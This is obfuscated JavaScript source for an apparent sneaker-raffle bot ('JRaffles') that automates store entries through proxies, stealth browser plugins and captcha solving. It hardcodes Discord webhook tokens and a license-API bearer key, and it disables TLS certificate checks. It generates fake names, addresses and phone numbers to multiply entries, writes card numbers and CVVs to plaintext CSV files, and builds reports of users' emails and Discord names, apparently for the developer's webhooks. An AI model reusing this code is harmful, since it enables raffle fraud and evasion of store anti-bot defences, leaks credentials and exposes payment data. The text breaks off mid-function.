process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x39c9ee = require('fs'), _0x141e4b = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x172470(_0xf35a4b) {
    const _0x40ca66 = _0x39c9ee['createWriteStream'](_0xf35a4b, { 'flags': 'a' }), _0x35d8ab = console['log'];
    console['log'] = function () {
        const _0x2cb782 = Array['prototype']['slice']['call'](arguments), _0x25e8eb = _0x2cb782['join']('\x20') + '\x0a';
        _0x40ca66['write'](_0x25e8eb), _0x35d8ab['apply'](console, _0x2cb782);
    };
}
_0x172470('../logs/log\x20' + _0x141e4b);
var _0xc03372 = require('tough-cookie'), _0x51510b = require('node-imap'), _0x92956d = require('util')['inspect'];
const _0x3f1b1e = require('mailparser')['simpleParser'], { EmbedBuilder: _0x4eb63f } = require('discord.js');
var _0x68eab1 = require('exe');
const { execFile: _0x244b4a } = require('child_process'), _0x27947 = require('puppeteer-extra'), _0x244ad0 = require('puppeteer-extra-plugin-recaptcha'), _0x2c72d8 = require('puppeteer-extra-plugin-stealth'), _0x3c5615 = require('chalk'), _0x5b3b18 = require('node-bash-title'), _0x3c7f7c = require('axios'), _0x54f615 = require('papaparse');
var _0x17cd60 = require('random-name');
const _0x2131de = require('request');
var _0x67cf96 = require('prompt');
const _0x5037e5 = _0x2131de['jar']();
var _0x409619 = {};
const _0x5320a7 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0xf1ed67 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x2996cb = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x386001 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x33830c = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x4deb4a = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x20573a = 'https://discord.com/api/webhooks/', _0x5e99dd = '' + _0x20573a + _0x2996cb, _0x3213ac = '' + _0x20573a + _0x386001, _0x31bbcd = '' + _0x20573a + _0x5320a7, _0x451f96 = '' + _0x20573a + _0xf1ed67, _0x171aec = '' + _0x20573a + _0x33830c, _0x565fb1 = '' + _0x20573a + _0x4deb4a;
const _0x357eea = JSON['parse'](_0x39c9ee['readFileSync']('../package.json', 'utf-8')), _0x41a50b = _0x357eea['version'];
var _0x5e8965, _0x571870, _0x1b6cd8, _0x117168, _0x3addd6, _0x33f28b, _0xeaf750, _0x291599;
const _0x8cfd17 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x117dcd = ![];
const _0xebb6b8 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x40af2b = '0123456789';
var _0x520e53 = _0xebb6b8['split']('');
const _0xbbcdea = require('auto-git-update'), _0x74f5bd = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x56ce27 = new _0xbbcdea(_0x74f5bd);
async function _0x455fd4() {
    _0x3addd6 = _0x39c9ee['readdirSync']('../proxies'), _0x117168 = _0x39c9ee['readdirSync']('../tasks'), !_0x39c9ee['existsSync']('../accounts/fenom.csv') && _0x39c9ee['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x39c9ee['existsSync']('../accounts/paypal.csv') && _0x39c9ee['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x39c9ee['existsSync']('../accounts/bstn.csv') && _0x39c9ee['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x39c9ee['existsSync']('../accounts/eql.csv') && _0x39c9ee['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x39c9ee['existsSync']('../failed-tasks.csv') && _0x39c9ee['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x39c9ee['existsSync']('../successful-tasks.csv') && _0x39c9ee['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x409619 = JSON['parse'](_0x39c9ee['readFileSync']('../settings.json', 'utf-8')), !_0x409619['delay'] && (_0x409619['delay'] = 0x3c, _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['masterMail'] && (_0x409619['masterMail'] = 'yourmail@gmail.com', _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['masterPassword'] && (_0x409619['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['captchaKey'] && (_0x409619['captchaKey'] = '', _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['useRandomProxy'] && (_0x409619['useRandomProxy'] = !![], _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['shuffleTasks'] && (_0x409619['shuffleTasks'] = ![], _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), !_0x409619['webhook'] && (_0x409619['webhook'] = '', _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), _0x409619['delay'] <= 0x1388 && (_0x409619['delay'] = _0x409619['delay'] * 0x3e8), _0x409619['AfewDelay'] && (delete _0x409619['AfewDelay'], _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), _0x409619['MahaDelay'] && (delete _0x409619['MahaDelay'], _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), _0x409619['footshopDelay'] && (delete _0x409619['footshopDelay'], _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619, null, 0x2))), _0x409619['MahaDelay'] = _0x409619['delay'], _0x20573a = _0x409619['webhook'], _0x33f28b = _0x409619['licenseKey'];
}
let _0x2511a4, _0x377b9d = [], _0x3f72f1;
const _0x50b4f8 = _0x4fc0dc => new Promise(_0x2fa18b => setTimeout(_0x2fa18b, _0x4fc0dc));
function _0x25f2b2(_0x1ab59c, _0x58c992) {
    return Math['floor'](Math['random']() * (_0x58c992 - _0x1ab59c + 0x1) + _0x1ab59c);
}
function _0x4ff1d7(_0x772e60) {
    let _0x548ff0 = _0x772e60['length'], _0x55f337;
    while (_0x548ff0 != 0x0) {
        _0x55f337 = Math['floor'](Math['random']() * _0x548ff0), _0x548ff0--, [_0x772e60[_0x548ff0], _0x772e60[_0x55f337]] = [
            _0x772e60[_0x55f337],
            _0x772e60[_0x548ff0]
        ];
    }
    return _0x772e60;
}
async function _0x2cbee7(_0x4cfc71) {
    return _0x3c7f7c['get']('https://api.hyper.co/v4/licenses/' + _0x4cfc71, { 'headers': { 'Authorization': 'Bearer\x20' + _0x8cfd17 } })['then'](_0x46348e => _0x46348e['data'])['catch'](() => null);
}
;
async function _0x4d2875(_0x76a427) {
    console['clear']();
    if (_0x76a427 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x2e5193 = await _0x67cf96['get']('License');
        if (_0x2e5193['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x50b4f8(0xbb8), _0x4d2875(_0x76a427);
        _0x76a427 = _0x2e5193['License'], _0x409619['licenseKey'] = _0x76a427, _0x33f28b = _0x76a427, _0x39c9ee['writeFileSync']('../settings.json', JSON['stringify'](_0x409619));
    }
    console['log']('Checking\x20license\x20' + _0x33f28b + '...'), await _0x50b4f8(0x320);
    const _0x595d27 = await _0x2cbee7(_0x76a427);
    _0xeaf750 = JSON['stringify'](_0x595d27['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x291599 = JSON['stringify'](_0x595d27['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x595d27)
        return console['log']('License\x20not\x20found');
    if (!_0x595d27['user'])
        return console['log']('License\x20not\x20bound');
    return _0x595d27['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x117dcd = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x117dcd = ![]);
}
async function _0x2eaef7() {
    var _0x2bf82a = await _0x67cf96['get']('Module');
    return console['clear'](), _0x2bf82a['Module'];
}
;
async function _0x507c22() {
    var _0x8be8d = await _0x67cf96['get']('Setting');
    return console['clear'](), _0x8be8d['Setting'];
}
async function _0x5c0f72(_0x53b7ad) {
    var _0x162825 = [];
    for (file of _0x117168) {
        var _0x1cbd94 = _0x39c9ee['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x54f615['parse'](_0x1cbd94, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x53b7ad['store'] && _0x162825['push'](file);
    }
    !_0x162825['length'] == 0x0 && (_0x117168 = _0x162825);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x49e6b1 = 0x0; _0x49e6b1 < _0x117168['length']; _0x49e6b1++) {
        console['log']('\x20(' + _0x49e6b1 + ')\x20' + _0x117168[_0x49e6b1]);
    }
    console['log']('');
    var _0x374b0a = await _0x67cf96['get']('Task');
    if (_0x374b0a['Task'] > _0x117168['length'] - 0x1 || isNaN(_0x374b0a['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x50b4f8(0x3e8), _0x5c0f72();
    var _0x1d1b3f = _0x39c9ee['readFileSync']('../tasks/' + _0x117168[_0x374b0a['Task']], 'utf-8');
    return _0x1b6cd8 = _0x54f615['parse'](_0x1d1b3f, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x3c5615['blue'](_0x117168[_0x374b0a['Task']])), _0x5e8965 = _0x117168[_0x374b0a['Task']], _0x1b6cd8;
}
async function _0x49a494() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x29166e = 0x0; _0x29166e < _0x3addd6['length']; _0x29166e++) {
        console['log']('\x20(' + _0x29166e + ')\x20' + _0x3addd6[_0x29166e]);
    }
    console['log']('');
    var _0x490cef = await _0x67cf96['get']('Proxies');
    if (_0x490cef['Proxies'] > _0x3addd6['length'] - 0x1 || isNaN(_0x490cef['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x50b4f8(0x3e8), _0x49a494();
    var _0x529bbe = _0x39c9ee['readFileSync']('../proxies/' + _0x3addd6[_0x490cef['Proxies']], 'utf-8')['split']('\x0a');
    let _0x174d58 = _0x529bbe['map']((_0x2a2186, _0x188393) => {
        sanatizeProxy = _0x2a2186['replace']('\x0d', '');
        if (_0x529bbe[_0x188393 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x571870 = _0x3addd6[_0x490cef['Proxies']], console['clear'](), _0x174d58;
}
async function _0x13971c() {
    var _0x5d6aab = await _0x67cf96['get']('Value');
    return console['clear'](), _0x5d6aab['Value'];
}
async function _0x465f5a(_0x4c2e08) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x235e5a = 0x0; _0x235e5a < _0x4c2e08['length']; _0x235e5a++) {
        console['log']('\x20(' + _0x235e5a + ')\x20[' + _0x4c2e08[_0x235e5a]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x5a64c0 = await _0x67cf96['get']('Module');
    return _0x5a64c0['Module'];
}
async function _0x5ef7ec() {
    var _0x1a2507 = await _0x67cf96['get']('Password');
    return console['clear'](), _0x1a2507['Password'];
}
;
async function _0x2c0f8c() {
    var _0x117a84 = await _0x67cf96['get']('Links');
    return _0x117a84['Links'];
}
;
async function _0x2775cd() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x5cc5fd = 0x0; _0x5cc5fd < _0x377b9d['length']; _0x5cc5fd++) {
        console['log']('\x20(' + _0x5cc5fd + ')\x20' + _0x377b9d[_0x5cc5fd]);
    }
    ;
    console['log']();
    let _0x44eb9c = await _0x67cf96['get']('Product');
    return console['clear'](), _0x44eb9c['Product'];
}
;
function _0x3996da() {
    var _0x1b1ea3 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x1b1ea3;
}
;
function _0x47ff50() {
    var _0x43d7ae = new Date(Date['now']())['toLocaleString']();
    return _0x43d7ae['replace'](',', '');
}
async function _0x21ec0c(_0x1b4572, _0x1633ac) {
    let _0x18cfdb = { 'headers': { 'content-type': 'application/json' } };
    if (_0x41a50b != 'devkey') {
        await _0x3c7f7c['post'](_0x1b4572, _0x1633ac, _0x18cfdb);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x4808d0(_0x590cef, _0x597b36, _0x1adc10, _0x5ab3a0, _0x2eb000) {
    if (!_0x5ab3a0 && _0x1adc10 == 'dev') {
        var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x597b36['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x597b36['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x590cef['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x409619['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0xeaf750,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x590cef['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x590cef['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x41a50b,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x36fb2e['data'];
    } else {
        if (_0x5ab3a0 && _0x1adc10 == 'dev') {
            var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x597b36['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0xeaf750,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x597b36['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x590cef['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x409619['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x2eb000,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x590cef['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x590cef['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x41a50b,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x36fb2e['data'];
        } else {
            if (_0x1adc10 == 'pub') {
                var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x597b36['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x597b36['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x590cef['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x409619['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x590cef['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x41a50b,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x36fb2e['data'];
            } else {
                if (_0x1adc10 == 'acc' && !_0x5ab3a0) {
                    var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x597b36['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0xeaf750,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x597b36['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x409619['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x41a50b,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x36fb2e['data'];
                } else {
                    if (_0x1adc10 == 'acc' && _0x5ab3a0) {
                        var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x597b36['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0xeaf750,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x2eb000,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x597b36['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x409619['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x41a50b,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x36fb2e['data'];
                    } else {
                        if (_0x1adc10 == 'open') {
                            var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x291599)['addFields']({
                                'name': 'User',
                                'value': '' + _0xeaf750,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x41a50b,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x36fb2e['data'];
                        } else {
                            if (!_0x5ab3a0 && _0x1adc10 == 'ver') {
                                var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x597b36['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0xeaf750,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x597b36['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x409619['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x41a50b,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x36fb2e['data'];
                            } else {
                                if (_0x5ab3a0 && _0x1adc10 == 'ver') {
                                    var _0x36fb2e = new _0x4eb63f()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x597b36['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0xeaf750,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x2eb000,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x597b36['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x409619['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x41a50b,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x36fb2e['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x5a027c(_0x4ea9ae, _0x2b9728) {
    var _0x3839e3 = _0x4ea9ae[_0x2b9728]['Address1']['split'](''), _0x405949 = _0x4ea9ae[_0x2b9728]['Address2']['split'](''), _0x3a0f35 = _0x4ea9ae[_0x2b9728]['Email']['split']('@');
    for (var _0x574124 = 0x0; _0x574124 < _0x3839e3['length']; _0x574124++) {
        if (_0x3839e3[_0x574124] == 'X') {
            var _0x365d7e = Math['round'](Math['random']() * (_0xebb6b8['length'] - 0x1));
            _0x3839e3[_0x574124] = _0x520e53[_0x365d7e];
        }
    }
    ;
    for (var _0x574124 = 0x0; _0x574124 < _0x405949['length']; _0x574124++) {
        if (_0x405949[_0x574124] == 'X') {
            var _0x365d7e = Math['round'](Math['random']() * (_0xebb6b8['length'] - 0x1));
            _0x405949[_0x574124] = _0x520e53[_0x365d7e];
        }
    }
    ;
    _0x4ea9ae[_0x2b9728]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x4ea9ae[_0x2b9728]['FirstName'] = _0x17cd60['first']());
    _0x4ea9ae[_0x2b9728]['LastName']['toUpperCase']() == 'RANDOM' && (_0x4ea9ae[_0x2b9728]['LastName'] = _0x17cd60['last']());
    _0x3a0f35[0x0]['toUpperCase']() == 'RANDOM' ? _0x3a0f35[0x0] = '' + _0x17cd60['first']() + _0x17cd60['last']() + _0x25f2b2(0x1, 0x270f) + '@' : _0x3a0f35[0x0] = _0x3a0f35[0x0] + '@';
    _0x4ea9ae[_0x2b9728]['Email'] = _0x3a0f35['join'](''), _0x4ea9ae[_0x2b9728]['Address1'] = _0x3839e3['join'](''), _0x4ea9ae[_0x2b9728]['Address2'] = _0x405949['join']('');
    _0x4ea9ae[_0x2b9728]['Phone'] == 'RANDOM' && (_0x4ea9ae[_0x2b9728]['Phone'] = '0' + _0x25f2b2(0x5f5e100, 0x3b9ac9ff));
    if (_0x4ea9ae[_0x2b9728]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x294682 = _0x25f2b2(0x1, 0x270f);
        _0x4ea9ae[_0x2b9728]['Follower'] = '' + _0x17cd60['first']() + _0x17cd60['last']() + _0x294682 + '\x20';
    }
    _0x4ea9ae[_0x2b9728]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x4ea9ae[_0x2b9728]['HouseNumber'] = _0x25f2b2(0x1, 0xc8));
    if (_0x4ea9ae[_0x2b9728]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x37a691 = Math['round'](Math['random']() * (_0xebb6b8['length'] - 0x1)), _0x42f1cd = _0x520e53[_0x37a691];
        _0x4ea9ae[_0x2b9728]['Address1'] = _0x17cd60['last']() + 'straat', _0x4ea9ae[_0x2b9728]['Zip'] == '' && (_0x4ea9ae[_0x2b9728]['Postcode'] = _0x25f2b2(0x3e8, 0x270f) + '\x20' + _0x42f1cd + _0x42f1cd, _0x4ea9ae[_0x2b9728]['Zip'] = _0x4ea9ae[_0x2b9728]['Postcode']), _0x4ea9ae[_0x2b9728]['HouseNumber'] = '' + _0x25f2b2(0x1, 0xc8);
    }
    return;
}
;
async function _0x61dfa6(_0x122864, _0x73a1bb) {
    _0x39c9ee['appendFileSync']('../failed-tasks.csv', _0x47ff50() + ',' + _0x73a1bb['store'] + ',' + _0x73a1bb['name'] + ',' + _0x122864['Url'] + ',' + _0x122864['Size'] + ',' + _0x122864['Follower'] + ',' + _0x122864['FirstName'] + ',' + _0x122864['LastName'] + ',' + _0x122864['Address1'] + ',' + _0x122864['Address2'] + ',' + _0x122864['HouseNumber'] + ',' + _0x122864['Zip'] + ',' + _0x122864['City'] + ',' + _0x122864['State'] + ',' + _0x122864['Country'] + ',' + _0x122864['Phone'] + ',' + _0x122864['Email'] + ',' + _0x122864['Password'] + ',' + _0x122864['PaymentMethod'] + ',' + _0x122864['CardType'] + ',' + _0x122864['NameOnCard'] + ',' + _0x122864['CardNumber'] + ',' + _0x122864['ExpiryDate'] + ',' + _0x122864['CVV'] + ',' + _0x122864['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x1474be(_0x3c4c3b, _0x56732d) {
    _0x39c9ee['appendFileSync']('../successful-tasks.csv', _0x47ff50() + ',' + _0x56732d['store'] + ',' + _0x56732d['name'] + ',' + _0x3c4c3b['Url'] + ',' + _0x3c4c3b['Size'] + ',' + _0x3c4c3b['Follower'] + ',' + _0x3c4c3b['FirstName'] + ',' + _0x3c4c3b['LastName'] + ',' + _0x3c4c3b['Address1'] + ',' + _0x3c4c3b['Address2'] + ',' + _0x3c4c3b['HouseNumber'] + ',' + _0x3c4c3b['Zip'] + ',' + _0x3c4c3b['City'] + ',' + _0x3c4c3b['State'] + ',' + _0x3c4c3b['Country'] + ',' + _0x3c4c3b['Phone'] + ',' + _0x3c4c3b['Email'] + ',' + _0x3c4c3b['Password'] + ',' + _0x3c4c3b['PaymentMethod'] + ',' + _0x3c4c3b['CardType'] + ',' + _0x3c4c3b['NameOnCard'] + ',' + _0x3c4c3b['CardNumber'] + ',' + _0x3c4c3b['ExpiryDate'] + ',' + _0x3c4c3b['CVV'] + ',' + _0x3c4c3b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x40068f() {
    let _0x200eb3 = proxyFile['split']('\x0a'), _0x35370a = _0x200eb3['map']((_0x49a4bd, _0x350a2e) => {
        sanatizeProxy = _0x49a4bd['replace']('\x0d', '');
        if (_0x200eb3[_0x350a2e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x35370a;
}
;
async function _0x5d712b(_0x20bedd, _0x55202d) {
    if (_0x20939e != 'yes')
        var _0x20939e = '', _0x426a81 = 0x0;
    async function _0x193e77() {
        var _0x2bf810 = _0x39c9ee['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x4a97c9 = _0x54f615['parse'](_0x2bf810, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x459aba = 0x0; _0x459aba < _0x4a97c9['length']; _0x459aba++) {
            console['log']('(' + _0x459aba + ')\x20' + _0x4a97c9[_0x459aba]['Email']);
        }
        console['log']('\x0a(' + _0x4a97c9['length'] + ')\x20' + _0x3c5615['cyan']('Add\x20a\x20new\x20account'));
        let _0x3d75cb = await _0x67cf96['get']('Option');
        if (_0x3d75cb['Option'] < _0x4a97c9['length'])
            return _0x4a97c9[_0x3d75cb['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x3c0bbb = {}, _0x49e775 = await _0x67cf96['get']('Email');
        _0x3c0bbb['Email'] = _0x49e775['Email'];
        var _0x11b31f = Math['round'](Math['random']() * (_0x55202d['length'] - 0x1));
        _0x3c0bbb['Proxy'] = _0x55202d[_0x11b31f], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x2cfa90 = await _0x67cf96['get']('Password');
